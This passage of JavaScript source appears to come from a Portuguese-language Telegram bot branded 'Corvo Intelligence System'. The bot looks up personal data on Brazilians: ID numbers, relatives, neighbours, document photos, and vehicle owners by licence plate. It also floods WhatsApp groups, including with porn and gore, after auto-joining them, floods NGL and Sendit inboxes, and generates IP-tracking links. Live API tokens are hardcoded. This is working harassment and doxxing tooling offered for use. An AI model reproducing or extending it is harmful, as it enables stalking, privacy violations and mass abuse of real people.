        const TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJCb3QgY2xpZW50ZXMg4oCiIE1vbW8gYXlhc2UgIiwianRpIjoiZGQxYTNhYjMtOTViZi00ZDNjLWE1YTItMmYyZWFhMjIzODE4IiwiaWF0IjoxNzcwNjUyOTY4fQ.bwkkrVk0GdhYgP8yGZBm2IdoFnG-KNmnJCjxHJ-XkSE';

        try {
            const response = await axios.get(API_URL, {
                params: { url: link },
                headers: { Authorization: `Bearer ${TOKEN}` },
                responseType: 'arraybuffer'
            });
            await ctx.telegram.sendVideo(tid, { source: Buffer.from(response.data) }, { caption: '✅ • *Vídeo baixado com sucesso!*', parse_mode: 'Markdown' });
            await ctx.deleteMessage(msgWait.message_id).catch(() => { });
        } catch (e) {
            logEvent('ERROR', `Erro TikTok: ${e.message}`);
            ctx.reply('❌ • Erro ao baixar vídeo do TikTok. Verifique o link ou tente novamente mais tarde.');
        }

    } else if (['wait_nome_pro', 'wait_score', 'wait_vizinhos', 'wait_parentes', 'wait_email', 'wait_instagram_osint', 'wait_cns', 'wait_pis', 'wait_crm', 'wait_oab', 'wait_cnh', 'wait_obito', 'wait_qsa', 'wait_renavam', 'wait_inss', 'wait_rg', 'wait_operadora'].includes(state)) {
        delete userStates[tid];
        const query = text.trim();
        const type = state.replace('wait_', '');
        const labels = { 'nome_pro': 'Nome Pro', 'score': 'Score', 'vizinhos': 'Vizinhos', 'parentes': 'Parentes', 'email': 'E-mail', 'instagram_osint': 'Instagram', 'cns': 'CNS', 'pis': 'PIS', 'crm': 'CRM', 'oab': 'OAB', 'cnh': 'CNH', 'bin': 'BIN', 'obito': 'Óbito', 'qsa': 'Empresa (QSA)', 'renavam': 'RENAVAM', 'inss': 'INSS', 'rg': 'RG Nacional', 'operadora': 'Operadora' };
        const loader = await createLoadingBar(ctx, `Consulta ${labels[type]}`);


        try {
            // Mapeamento correto de parâmetros para a API GonzalesDev
            let apiParam = 'cpf'; // Padrão
            if (type === 'nome_pro') apiParam = 'nome';
            else if (type === 'instagram_osint') apiParam = 'user';
            else if (type === 'email') apiParam = 'email';
            else if (type === 'bin') apiParam = 'bin';
            else if (type === 'ddd') apiParam = 'ddd';
            else if (type === 'placa') apiParam = 'placa';
            else if (type === 'renavam') apiParam = 'renavam';
            else if (type === 'rg') apiParam = 'rg';
            else if (type === 'operadora') apiParam = 'tel';

            const url = `${CONSULTAS_API_BASE}?token=${CONSULTAS_TOKEN}&r=${type}&${apiParam}=${encodeURIComponent(query)}`;
            const res = await fetchApi(url, 3, 1000);

            if (res.error || res.erro) {
                if (loader) await loader.stop('Erro', `❌ <b>${(res.message || res.erro || 'Não encontrado').toUpperCase()}</b>`);
                return;
            }


            const d = res.dados || res;

            let resultText = '';
            if (typeof d === 'string') {
                resultText += d;
            } else if (Array.isArray(d)) {
                d.slice(0, 10).forEach((item, i) => {
                    resultText += `<b>Resultado ${i + 1}:</b>\n${JSON.stringify(item, null, 2)}\n\n`;
                });
            } else {
                Object.entries(d).forEach(([key, value]) => {
                    if (typeof value !== 'object') resultText += `• <b>${key}:</b> <code>${value}</code>\n`;
                });
            }

            let msg = `<blockquote>🔍 <b>RESULTADO ${labels[type].toUpperCase()}</b>\n\n` +
                resultText +
                `\n⚡ <i>Corvo Intelligence System</i></blockquote>`;

            if (msg.length > 4000) {
                const filePath = `./temp_${type}_${tid}.txt`;
                fs.writeFileSync(filePath, msg.replace(/<[^>]*>/g, ''));
                await ctx.replyWithDocument({ source: filePath, filename: `resultado_${type}.txt` }, { caption: `✅ • Consulta concluída.` });
                fs.unlinkSync(filePath);
                if (loader) await bot.telegram.deleteMessage(tid, loader.message_id).catch(() => { });
            } else {
                if (loader) await loader.stop(`Resultado ${labels[type]}`, msg);
            }

        } catch (e) {
            if (loader) await loader.stop('Erro', '<blockquote>❌ <b>ERRO NO PROCESSAMENTO</b>\nTente novamente mais tarde.</blockquote>');
        }


    } else if (state === 'wait_bin') {
        delete userStates[tid];
        const bin = text.replace(/[^0-9]/g, '').substring(0, 6);
        const loader = await createLoadingBar(ctx, 'Consulta BIN');
        try {
            // API Pública Primária: Binlist
            const res = await axios.get(`https://lookup.binlist.net/${bin}`, { timeout: 5000 });
            const d = res.data;
            const msg = `<blockquote>💳 <b>DADOS DA BIN (PUBLIC)</b>\n\n` +
                `• <b>Bandeira:</b> <code>${d.scheme?.toUpperCase() || 'N/A'}</code>\n` +
                `• <b>Tipo:</b> <code>${d.type?.toUpperCase() || 'N/A'}</code>\n` +
                `• <b>Marca:</b> <code>${d.brand || 'N/A'}</code>\n` +
                `• <b>Banco:</b> <code>${d.bank?.name || 'N/A'}</code>\n` +
                `• <b>País:</b> <code>${d.country?.name || 'N/A'} ${d.country?.emoji || ''}</code>\n\n` +
                `⚡ <i>Corvo Intelligence System</i></blockquote>`;
            if (loader) await loader.stop('Resultado BIN', msg);
        } catch (e) {
            // API Secundária (Fallback): GonzalesDev
            try {
                const url = `${CONSULTAS_API_BASE}?token=${CONSULTAS_TOKEN}&r=bin&bin=${bin}`;
                const res = await fetchApi(url, 2, 1000);
                if (res && !res.error && !res.erro) {
                    const d = res.dados || res;
                    const msg = `<blockquote>💳 <b>DADOS DA BIN (ELITE)</b>\n\n` +
                        `• <b>Bandeira:</b> <code>${d.bandeira || d.scheme || 'N/A'}</code>\n` +
                        `• <b>Tipo:</b> <code>${d.tipo || d.type || 'N/A'}</code>\n` +
                        `• <b>Banco:</b> <code>${d.banco || d.bank || 'N/A'}</code>\n` +
                        `• <b>Nível:</b> <code>${d.nivel || 'N/A'}</code>\n\n` +
                        `⚡ <i>Corvo Intelligence System</i></blockquote>`;
                    if (loader) await loader.stop('Resultado BIN', msg);
                    return;
                }
            } catch (err2) { }
            if (loader) await loader.stop('Não Encontrado', '<blockquote>❌ <b>BIN NÃO ENCONTRADA</b>\nVerifique o número e tente novamente.</blockquote>');
        }

        return;

    } else if (state === 'wait_ddd') {
        delete userStates[tid];
        const ddd = text.replace(/[^0-9]/g, '');
        const loader = await createLoadingBar(ctx, 'Consulta DDD');
        try {
            // API Pública Primária: BrasilAPI
            const res = await axios.get(`https://brasilapi.com.br/api/ddd/v1/${ddd}`);
            const d = res.data;
            const msg = `<blockquote>📞 <b>DADOS DO DDD ${ddd}</b>\n\n` +
                `• <b>Estado:</b> <code>${d.state}</code>\n` +
                `• <b>Cidades:</b> <code>${d.cities.slice(0, 10).join(', ')}${d.cities.length > 10 ? '...' : ''}</code>\n\n` +
                `⚡ <i>Corvo Intelligence System</i></blockquote>`;
            if (loader) await loader.stop('Resultado DDD', msg);
        } catch (e) {
            // API Secundária (Fallback): GonzalesDev
            try {
                const url = `${CONSULTAS_API_BASE}?token=${CONSULTAS_TOKEN}&r=ddd&ddd=${ddd}`;
                const res = await fetchApi(url, 2, 1000);
                if (res && !res.error && !res.erro) {
                    const d = res.dados || res;
                    const msg = `<blockquote>📞 <b>DADOS DO DDD ${ddd} (B2)</b>\n\n` +
                        `• <b>Estado:</b> <code>${d.estado || d.uf || 'N/A'}</code>\n` +
                        `• <b>Região:</b> <code>${d.regiao || 'N/A'}</code>\n\n` +
                        `⚡ <i>Corvo Intelligence System</i></blockquote>`;
                    if (loader) await loader.stop('Resultado DDD', msg);
                    return;
                }
            } catch (err2) { }
            if (loader) await loader.stop('Erro', '<blockquote>❌ <b>DDD NÃO ENCONTRADO</b></blockquote>');
        }

        return;

    } else if (state === 'wait_placa') {
        delete userStates[tid];
        const loader = await createLoadingBar(ctx, 'Consulta Placa');
        logEvent('INFO', `Consulta Placa: ${placa} | Usuário: ${tid}`);
        try {
            const url = `${CONSULTAS_API_BASE}?token=${CONSULTAS_TOKEN}&r=serpro&placa=${placa}`;
            const res = await fetchApi(url, 3, 1000);

            if (res.error || res.erro) {
                const errorMsg = res.message || res.erro || 'Erro ao processar a consulta.';
                if (loader) await loader.stop('Erro', `❌ <b>${errorMsg.toUpperCase()}</b>`);
                return;
            }

            const d = res;
            if (!d.chassi && !d.placa) {
                if (loader) await loader.stop('Não Encontrado', '❌ <b>PLACA NÃO ENCONTRADA EM NOSSA BASE.</b>');
                return;
            }
            let msg = `<blockquote>🔍 <b>RESULTADO PLACA (SERPRO)</b>\n\n` +
                `🚗 <b>DADOS DO VEÍCULO</b>\n` +
                `• <b>Placa:</b> <code>${d.placa_antiga || 'N/A'}</code> / <code>${d.placa_mercosul || 'N/A'}</code>\n` +
                `• <b>Chassi:</b> <code>${d.chassi || 'N/A'}</code>\n` +
                `• <b>Renavam:</b> <code>${d.codigoRenavam || 'N/A'}</code>\n` +
                `• <b>Modelo:</b> <code>${d.descricaoMarcaModelo || 'N/A'}</code>\n` +
                `• <b>Ano:</b> <code>${d.anoFabricacao || 'N/A'}</code> / <code>${d.anoModelo || 'N/A'}</code>\n` +
                `• <b>Cor:</b> <code>${d.descricaoCor || 'N/A'}</code>\n` +
                `• <b>Combustível:</b> <code>${d.descricaoCombustivel || 'N/A'}</code>\n` +
                `• <b>Município:</b> <code>${d.descricaoMunicipioEmplacamento || 'N/A'} - ${d.ufJurisdicao || 'N/A'}</code>\n` +
                `• <b>Situação:</b> <code>${d.situacao || 'N/A'}</code>\n\n` +
                `👤 <b>PROPRIETÁRIO</b>\n` +
                `• <b>Nome:</b> <code>${d.nomeProprietario || 'N/A'}</code>\n` +
                `• <b>Doc:</b> <code>${d.numeroIdentificacaoProprietario || 'N/A'}</code>\n\n` +
                `⚠️ <b>ALERTAS</b>\n` +
                `• <b>Roubo/Furto:</b> <code>${d.indicadorRouboFurto ? '🚨 SIM' : '✅ NÃO'}</code>\n` +
                `• <b>Leilão:</b> <code>${d.indicadorLeilao ? '⚠️ SIM' : '✅ NÃO'}</code>\n\n` +
                `⚡ <i>Corvo Intelligence System</i></blockquote>`;
            if (loader) await loader.stop('Resultado Placa', msg);
        } catch (e) {
            logEvent('ERROR', `Erro na API Placa: ${e.message}`);
            if (loader) await loader.stop('Erro', '❌ <b>ERRO INTERNO NA CONSULTA DE PLACA.</b>');
        }

    } else if (state === 'wait_global_keyword') {
        delete userStates[tid];
        const keyword = text.trim();
        if (keyword === '🔙 • VOLTAR') return sendMainMenuProfile(ctx, tid);
        const sock = userSessions[tid];
        if (!sock?.user) return ctx.reply('❌ • WhatsApp Desconectado.');

        const loader = await createLoadingBar(ctx, 'Busca Global');


        try {
            const result = await fetchWebGroups(keyword);
            if (!result || result.length === 0) {
                if (loader) await loader.stop('Sem Resultados', `❌ • Nenhum grupo encontrado para "<b>${keyword}</b>".`);
                return;
            }


            const groupsToRajar = result.slice(0, 5); // Limita a 5 grupos para segurança
            if (loader) await loader.update(100, 100, `Busca Concluída (${result.length} grupos)`);


            for (const group of groupsToRajar) {
                try {
                    // Tenta entrar no grupo primeiro (usando o link)
                    const code = group.link.split('chat.whatsapp.com/')[1];
                    if (code) {
                        const jid = await sock.groupAcceptInvite(code);
                        if (jid) {
                            await delay(2000);
                            // Raja o grupo
                            await rajar(tid, jid, ctx, `🚀 <b>CORVO GLOBAL ATTACK</b>\n\nTema: ${keyword}`);
                            await delay(3000);
                        }
                    }
                } catch (e) {
                    logEvent('WARN', `Erro no Global Rajada (Grupo: ${group.name}): ${e.message}`);
                }
            }

            if (loader) await loader.stop('Busca Global', `<blockquote>✅ <b>RAJADA GLOBAL FINALIZADA!</b>\n\nO processo foi concluído em ${groupsToRajar.length} grupos.</blockquote>`);

        } catch (e) {
            logEvent('ERROR', `Erro no Global Rajada: ${e.message}`);
            if (loader) await loader.stop('Erro', '❌ <b>ERRO CRÍTICO NO RAJAR GLOBAL.</b>');
        }

    } else if (state === 'wait_foto_sp' || state === 'wait_foto_rj' || state === 'wait_foto_ba') {
        delete userStates[tid];
        const uf = state.replace('wait_foto_', '').toUpperCase();
        const rg = text.replace(/[^0-9]/g, '');
        const loader = await createLoadingBar(ctx, `Foto ${uf}`);
        logEvent('INFO', `Consulta Foto ${uf}: ${rg} | Usuário: ${tid}`);

        try {
            const url = `${CONSULTAS_API_BASE}?token=${CONSULTAS_TOKEN}&r=foto_${uf.toLowerCase()}&rg=${rg}`;
            const res = await fetchApi(url, 3, 1500);

            if (res.error || res.erro || !res.base64) {
                if (loader) await loader.stop('Não Encontrada', `❌ <b>FOTO (${uf}) NÃO ENCONTRADA.</b>`);
                return;
            }


            const buffer = Buffer.from(res.base64, 'base64');
            let msg = `<blockquote>📸 <b>RESULTADO FOTO (${uf})</b>\n\n` +
                `👤 <b>Nome:</b> ${res.nome || 'N/A'}\n` +
                `🪪 <b>RG:</b> <code>${rg}</code>\n\n` +
                `🚀 <i>Corvo Intelligence System</i></blockquote>`;

            await ctx.replyWithPhoto({ source: buffer }, { caption: msg, parse_mode: 'HTML' });
            if (loader) await bot.telegram.deleteMessage(tid, loader.message_id).catch(() => { });

        } catch (e) {
            logEvent('ERROR', `Erro na Consulta Foto ${uf}: ${e.message}`);
            if (loader) await loader.stop('Erro', `<blockquote>❌ <b>ERRO NA CONSULTA FOTO ${uf}</b></blockquote>`);
        }

    } else if (state === 'wait_foto_nacional') {
        delete userStates[tid];
        const cpf = text.replace(/[^0-9]/g, '');
        const loader = await createLoadingBar(ctx, 'Foto Nacional');
        logEvent('INFO', `Consulta Foto Nacional: ${cpf} | Usuário: ${tid}`);

        try {
            const url = `${CONSULTAS_API_BASE}?token=${CONSULTAS_TOKEN}&r=foto_cnh&cpf=${cpf}`;
            const res = await fetchApi(url, 3, 2000);

            if (res.error || res.erro || !res.base64) {
                if (loader) await loader.stop('Não Encontrada', '❌ <b>FOTO NACIONAL NÃO ENCONTRADA.</b>');
                return;
            }


            const buffer = Buffer.from(res.base64, 'base64');
            let msg = `<blockquote>📸 <b>RESULTADO FOTO (CNH NACIONAL)</b>\n\n` +
                `👤 <b>Nome:</b> ${res.nome || 'N/A'}\n` +
                `🔍 <b>CPF:</b> <code>${cpf}</code>\n\n` +
                `🚀 <i>Corvo Intelligence System</i></blockquote>`;

            await ctx.replyWithPhoto({ source: buffer }, { caption: msg, parse_mode: 'HTML' });
            if (loader) await bot.telegram.deleteMessage(tid, loader.message_id).catch(() => { });

        } catch (e) {
            logEvent('ERROR', `Erro na Consulta Foto Nacional: ${e.message}`);
            if (loader) await loader.stop('Erro', '<blockquote>❌ <b>ERRO NA CONSULTA FOTO NACIONAL</b></blockquote>');
        }

    } else if (state === 'wait_tts_text') {
        delete userStates[tid];
        const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(text)}&tl=pt&client=tw-ob`;
        ctx.replyWithAudio({ url: ttsUrl }, { caption: '🗣️ • <b>Áudio gerado com sucesso!</b>', parse_mode: 'HTML' }).catch(() => {
            ctx.reply('❌ • Erro ao gerar áudio.');
        });
    } else if (state === 'wait_shorten_link') {
        delete userStates[tid];
        try {
            const res = await axios.get(`https://is.gd/create.php?format=json&url=${encodeURIComponent(text)}`);
            ctx.reply(`🔗 • <b>LINK ENCURTADO:</b> ${res.data.shorturl}`, { parse_mode: 'HTML' });
        } catch (e) {
            ctx.reply('❌ • Erro ao encurtar link. Verifique se a URL é válida.');
        }
    } else if (state === 'wait_clima') {
        delete userStates[tid];
        const cidade = text.trim();
        ctx.reply(`⏳ • <b>Buscando previsão para:</b> <code>${cidade}</code>...`, { parse_mode: 'HTML' }).catch(() => { });
        try {
            const res = await axios.get(`http://api.weatherapi.com/v1/current.json?key=c8c07e604f32446f884140026240405&q=${encodeURIComponent(cidade)}&lang=pt`);
            const d = res.data;
            let msg = `<blockquote>☁️ <b>CLIMA TEMPO REAL</b>\n\n` +
                `📍 <b>Local:</b> <code>${d.location.name}, ${d.location.region} - ${d.location.country}</code>\n` +
                `🌡️ <b>Temperatura:</b> <code>${d.current.temp_c}°C</code> (Sensação: <code>${d.current.feelslike_c}°C</code>)\n` +
                `🌬️ <b>Condição:</b> <code>${d.current.condition.text}</code>\n` +
                `💧 <b>Umidade:</b> <code>${d.current.humidity}%</code>\n` +
                `💨 <b>Vento:</b> <code>${d.current.wind_kph} km/h</code>\n\n` +
                `⚡ <i>Corvo Intelligence System</i></blockquote>`;
            ctx.reply(msg, { parse_mode: 'HTML' });
        } catch (e) {
            ctx.reply('<blockquote>❌ <b>CIDADE NÃO ENCONTRADA</b>\nVerifique o nome e tente novamente.</blockquote>', { parse_mode: 'HTML' });
        }
    } else if (state === 'wait_rajar_id') {
        delete userStates[tid];
        const sock = userSessions[tid];
        if (!sock?.user) return ctx.reply('❌ • WhatsApp Desconectado.');

        const groupId = text.trim();
        if (!groupId.includes('@g.us')) {
            return ctx.reply('❌ • *ID Inválido.* IDs de grupo geralmente terminam com `@g.us`.\nExemplo: `120363023456789@g.us`', { parse_mode: 'Markdown' });
        }

        ctx.reply(`🎯 • *ID Selecionado:* \`${groupId}\`\n\nEscolha o tipo de rajada para este ID:`, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🚀 • Rajar 1 (Payment)', `rajar1_${groupId}`)],
                [Markup.button.callback('🚀 • Rajar 2 (Status)', `rajar2_${groupId}`)],
                [Markup.button.callback('🚀 • Rajar 3 (Mix)', `rajar3_${groupId}`)],
                [Markup.button.callback('🌊 • Rajar 4 (Flood Status)', `rajar4_${groupId}`)],
                [Markup.button.callback('🎬 • Rajar Porno', `rajarporno_${groupId}`)],
                [Markup.button.callback('🎬 • Rajar Gore', `rajargore_${groupId}`)]
            ])
        }).catch(() => { });
    } else if (state === 'wait_num') {
        delete userStates[tid];
        pairingInProgress[tid] = true;

        const phoneNumber = text.replace(/[^0-9]/g, '');
        if (!phoneNumber || phoneNumber.length < 10) {
            delete pairingInProgress[tid];
            return ctx.reply('❌ • *Número inválido.* Use o formato: `5511999999999`', { parse_mode: 'Markdown', ...getMainMenu(tid) }).catch(() => { });
        }

        const loader = await createLoadingBar(ctx, 'Conexão Corvo');


        try {
            const sessionDir = `./sessions/${tid}`;
            if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });
            fs.mkdirSync(sessionDir, { recursive: true });

            const sock = await connectToWhatsApp(tid, ctx);

            for (let i = 0; i < 15; i++) {
                if (sock.ws.isOpen) { isReady = true; break; }
                if (loader) await loader.update(i + 1, 15, `Sincronizando... [${i + 1}/15]`);
                await new Promise(resolve => setTimeout(resolve, 1000));
            }


            if (!isReady) throw new Error('O servidor do WhatsApp não respondeu a tempo.');

            if (loader) await loader.update(100, 100, 'Criptografando Túnel...');
            await new Promise(resolve => setTimeout(resolve, 2000));

            if (loader) await loader.update(100, 100, 'Gerando Chave Elite...');


            let pairingCode;
            try {
                pairingCode = await sock.requestPairingCode(phoneNumber);
            } catch (err) {
                logEvent('ERROR', `Erro ao solicitar código: ${err.message}`);
                throw new Error('Não foi possível gerar o código. Verifique se o número é válido.');
            }

            const finalMsg = `💎 *CONEXÃO ELITE CORVO*\n\n` +
                `Seu código de acesso exclusivo foi gerado com sucesso!\n\n` +
                `🔑 CÓDIGO: \`${pairingCode}\`\n\n` +
                `📌 *PASSO A PASSO:*\n` +
                `1️⃣ Abra o WhatsApp no seu celular.\n` +
                `2️⃣ Vá em **Aparelhos Conectados**.\n` +
                `3️⃣ Toque em **Conectar com número de telefone**.\n` +
                `4️⃣ Digite o código acima.\n\n` +
                `⚠️ *Aviso:* Se o código expirar, reinicie o processo.`;

            // ========================================
            // 📸 LINK DA FOTO PARA PAREAMENTO:
            // ========================================
            const pairingImageUrl = 'https://files.catbox.moe/imgawz.jpg';
            // ========================================

            if (loader) {
                await bot.telegram.deleteMessage(ctx.chat.id, loader.message_id).catch(() => { });
            }


            try {
                // Envia com foto
                await ctx.replyWithPhoto(pairingImageUrl, {
                    caption: finalMsg,
                    parse_mode: 'Markdown'
                });
            } catch (err) {
                // Se falhar, envia só texto
                ctx.reply(finalMsg, { parse_mode: 'Markdown' });
            }
        } catch (e) {
            logEvent('ERROR', `Erro Crítico no Pareamento: ${e.message}`);
            delete pairingInProgress[tid];
            // Se falhar, limpa a sessão para evitar lixo
            if (userSessions[tid]) {
                try { userSessions[tid].end(); } catch (err) { }
                delete userSessions[tid];
            }
            ctx.reply(`❌ • *Erro na Conexão Industrial:*\n\n_${e.message}_\n\nPor favor, tente novamente em 30 segundos.`, { parse_mode: 'Markdown', ...getMainMenu(tid) }).catch(() => { });
        }
    } else if (state === 'wait_qty') {
        delete userStates[tid];
        const qty = parseInt(text);
        if (isNaN(qty) || qty < 1 || qty > 100) return ctx.reply('❌ • Quantidade inválida. Use entre 1 e 100.', getConfigMenu(tid)).catch(() => { });
        const config = loadUserConfig(tid);
        config.quantidade = qty;
        saveUserConfig(tid);
        ctx.reply('✅ • Quantidade salva com sucesso!', getConfigMenu(tid)).catch(() => { });
    } else if (state === 'wait_delay') {
        delete userStates[tid];
        const delayMs = parseInt(text);
        if (isNaN(delayMs) || delayMs < 0) return ctx.reply('❌ • Delay inválido. Informe um número em milissegundos.', getConfigMenu(tid)).catch(() => { });
        const config = loadUserConfig(tid);
        config.delay = delayMs;
        saveUserConfig(tid);
        ctx.reply('✅ • Delay salva com sucesso!', getConfigMenu(tid)).catch(() => { });
    } else if (state === 'wait_flood_qty') {
        delete userStates[tid];
        let qty = parseInt(text);
        if (isNaN(qty) || qty < 1) qty = 1;
        if (qty > 50) qty = 50;
        const config = loadUserConfig(tid);
        config.quantidade_flood = qty;
        saveUserConfig(tid);
        ctx.reply(`✅ • QUANTIDADE salva: ${qty}`, getFloodConfigMenu(tid)).catch(() => { });
    } else if (state === 'wait_flood_delay') {
        delete userStates[tid];
        let dly = parseInt(text);
        if (isNaN(dly) || dly < 0) dly = 1000;
        const config = loadUserConfig(tid);
        config.delay = dly;
        saveUserConfig(tid);
        ctx.reply(`✅ • DELAY salvo: ${dly}ms`, getFloodConfigMenu(tid)).catch(() => { });
    } else if (state === 'wait_flood_text') {
        delete userStates[tid];
        const config = loadUserConfig(tid);
        config.texto = text;
        saveUserConfig(tid);
        ctx.reply(`✅ • TEXTO salvo com sucesso!`, getFloodConfigMenu(tid)).catch(() => { });
    } else if (state && state.startsWith('wait_rajar4_text_')) {
        const jid = state.replace('wait_rajar4_text_', '');
        delete userStates[tid];
        const customText = text.trim();
        if (!customText) {
            return ctx.reply('❌ • Texto inválido. Tente novamente.').catch(() => { });
        }

        // Verifica se é para TODOS os grupos
        if (jid === 'ALL_GROUPS') {
            const sock = userSessions[tid];
            if (!sock?.user) return ctx.reply('❌ • WhatsApp desconectado!').catch(() => { });
            try {
                const chats = await sock.groupFetchAllParticipating();
                const groups = Object.values(chats);
                if (groups.length === 0) return ctx.reply('❌ • Nenhum grupo encontrado.').catch(() => { });

                ctx.reply(`📝 • *Iniciando rajada em ${groups.length} grupos...*\n\n⏳ Isso pode levar alguns minutos.`, { parse_mode: 'Markdown' }).catch(() => { });

                for (const group of groups) {
                    try {
                        await rajar4FloodStatus(tid, group.id, ctx, 'text', null, customText);
                        await delay(5000); // Delay de 5s entre cada grupo
                    } catch (e) {
                        logEvent('ERROR', `Erro ao rajar grupo ${group.subject}: ${e.message}`);
                    }
                }
                ctx.reply(`✅ • *Rajada concluída em ${groups.length} grupos!*`, { parse_mode: 'Markdown' }).catch(() => { });
            } catch (e) {
                ctx.reply('❌ • Erro ao buscar grupos.').catch(() => { });
            }
        } else {
            // Rajar em um grupo específico
            ctx.reply(`📝 • *Texto recebido!* Iniciando rajada...`, { parse_mode: 'Markdown' }).catch(() => { });
            await rajar4FloodStatus(tid, jid, ctx, 'text', null, customText);
        }
    } else if (state && state.startsWith('wait_rajar1_text_')) {
        // === RAJAR 1 - TEXTO ===
        const jid = state.replace('wait_rajar1_text_', '');
        delete userStates[tid];
        const customText = text;
        ctx.reply(`📝 • *Texto recebido!* Iniciando Rajada Payment...`, { parse_mode: 'Markdown' }).then(msg => {
            setTimeout(() => ctx.deleteMessage(msg.message_id).catch(() => { }), 3000);
        }).catch(() => { });
        await rajar(tid, jid, ctx, customText);
    } else if (state && state.startsWith('wait_rajar2_text_')) {
        // === RAJAR 2 - TEXTO ===
        const jid = state.replace('wait_rajar2_text_', '');
        delete userStates[tid];
        const customText = text;
        ctx.reply(`📝 • *Texto recebido!* Iniciando Rajada Mencionar Status...`, { parse_mode: 'Markdown' }).then(msg => {
            setTimeout(() => ctx.deleteMessage(msg.message_id).catch(() => { }), 3000);
        }).catch(() => { });
        await rajarTexto(tid, jid, ctx, customText);
    } else if (state && state.startsWith('wait_rajar3_text_')) {
        // === RAJAR 3 - TEXTO ===
        const jid = state.replace('wait_rajar3_text_', '');
        delete userStates[tid];
        const customText = text;
        ctx.reply(`📝 • *Texto recebido!* Iniciando Rajada Payment + Status...`, { parse_mode: 'Markdown' }).then(msg => {
            setTimeout(() => ctx.deleteMessage(msg.message_id).catch(() => { }), 3000);
        }).catch(() => { });
        await rajarMisto(tid, jid, ctx, customText);
    } else if (state === 'wait_ngl_user') {
        delete userStates[tid];
        let username = text.trim();
        if (username.includes('ngl.link/')) {
            username = username.split('ngl.link/').pop().split('/')[0].split('?')[0];
        }
        ctx.reply(`🚀 • Iniciando flood NGL para: *${username}*...`, { parse_mode: 'Markdown' });
        runNGLFlood(tid, username, ctx);
    } else if (state === 'wait_sendit_link') {
        delete userStates[tid];
        let stickerId = text.trim();
        if (stickerId.includes('/s/')) {
            stickerId = stickerId.split('/s/').pop().split('?')[0];
        }
        ctx.reply(`🚀 • Iniciando flood Sendit para ID: *${stickerId}*...`, { parse_mode: 'Markdown' });
        runSenditFlood(tid, stickerId, ctx);
    } else if (state === 'wait_suggestion' || state === 'wait_bug') {
        delete userStates[tid];
        const type = state === 'wait_suggestion' ? 'Sugestão' : 'Bug';
        const feedback = {
            type: state === 'wait_suggestion' ? 'sugestao' : 'bug',
            user: tid,
            text: text,
            date: new Date().toLocaleString()
        };
        supportFeedbacks.push(feedback);
        saveSupport();

        // Notificar Admin em tempo real
        bot.telegram.sendMessage(ADMIN_ID, `🆘 • *NOVO FEEDBACK RECEBIDO*\n\n📌 *Tipo:* ${type}\n👤 *Usuário:* \`${tid}\`\n💬 *Mensagem:* ${text}`, { parse_mode: 'Markdown' }).catch(() => { });

        ctx.reply(`✅ • Sua ${type} foi enviada com sucesso! Obrigado por nos ajudar a melhorar o Corvo.`, { parse_mode: 'Markdown' }).catch(() => { });
    } else if (state === 'wait_donation_amount') {
        delete userStates[tid];
        const amount = parseFloat(text.replace(',', '.'));
        if (isNaN(amount) || amount < 1.0) return ctx.reply('❌ *VALOR INVÁLIDO*\n\nO valor mínimo para doação é de *R$ 1,00*. Por favor, envie um valor válido.', { parse_mode: 'Markdown' });

        const msgWait = await ctx.reply('⏳ *PROCESSANDO...*\n\nEstamos gerando o seu PIX de doação. Por favor, aguarde um momento...', { parse_mode: 'Markdown' });

        const total = amount + 0.50;
        const res = await promisseApi.createPix(total);

        await ctx.deleteMessage(msgWait.message_id).catch(() => { });

        if (res && res.pix_code) {
            pendingPayments[res.id] = { userId: tid, amount: Math.round(total * 100), type: 'donation', expiresAt: Date.now() + 30 * 60 * 1000 };
            savePayments();

            let msgPix = `💎 *CORVO • DOAÇÃO RECONHECIDA*\n\n`;
            msgPix += `Obrigado por contribuir com o projeto! Sua ajuda mantém o bot online e gratuito para todos.\n\n`;
            msgPix += `💰 *DETALHES DO PAGAMENTO*\n`;
            msgPix += `• Valor da Doação: \`R$ ${amount.toFixed(2)}\`\n`;
            msgPix += `• Taxa de Processamento: \`R$ 0.50\`\n`;
            msgPix += `• *Total a Pagar: R$ ${total.toFixed(2)}*\n\n`;
            msgPix += `📌 *CHAVE PIX (COPIA E COLA)*\n`;
            msgPix += `\`${res.pix_code}\`\n\n`;
            msgPix += `⚠️ _Este código expira em 30 minutos._\n`;
            msgPix += `✅ _O sistema detectará o pagamento automaticamente._`;

            ctx.reply(msgPix, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.url('📱 Pagar via Link (Opcional)', `https://pix.com.br/pay/${res.id}`)]
                ])
            }).catch(e => logEvent('ERROR', `Erro ao enviar PIX: ${e.message}`));
        } else {
            ctx.reply('❌ *ERRO NA GERAÇÃO*\n\nInfelizmente ocorreu um erro ao gerar o seu PIX. Nosso sistema de logs já registrou a falha. Por favor, tente novamente em instantes.', { parse_mode: 'Markdown' });
        }
    } else if (state === 'wait_url') {
        delete userStates[tid];
        ctx.reply('⏳ • Gerando link de rastreio de IP...').catch(() => { });
        const res = await criarRastreio(text);
        if (res.status) {
            const loggerId = res.link_rastreio.split('/').pop();
            userTrackerIds[tid] = loggerId;
            let msg = `✅ • LINK DE RASTREIO GERADO!\n\n`;
            msg += `• Link: \`${res.link_rastreio}\`\n`;
            msg += `• Key: \`${res.key_acesso}\`\n`;
            msg += `• Expira: \`${new Date(res.expira_em).toLocaleString('pt-BR')}\`\n\n`;
            msg += `⚠️ _O ID foi salvo automaticamente para consultas futuras._`;
            ctx.reply(msg, { parse_mode: 'Markdown' }).catch(() => { });
        } else {
            ctx.reply(`❌ • *Erro ao criar link:* ${res.mensagem || 'Não foi possível completar a ação.'}`).catch(() => { });
        }
    } else if (state === 'wait_log_info') {
        delete userStates[tid];
        const loggerId = userTrackerIds[tid];
        const input = text.trim();
        let finalId = loggerId;
        let finalKey = input;
        if (input.includes('|')) {
            const parts = input.split('|').map(p => p.trim());
            finalId = parts[0];
            finalKey = parts[1];
        }

        if (!finalId) {
            return ctx.reply('❌ • Nenhum ID de rastreio encontrado! Por favor, use o formato: `ID|KEY`').catch(() => { });
        }
        ctx.reply('⏳ • Consultando logs de acesso...').catch(() => { });
        const res = await consultarLogs(finalId, finalKey);
        if (res.status) {
            if (res.external_link) {
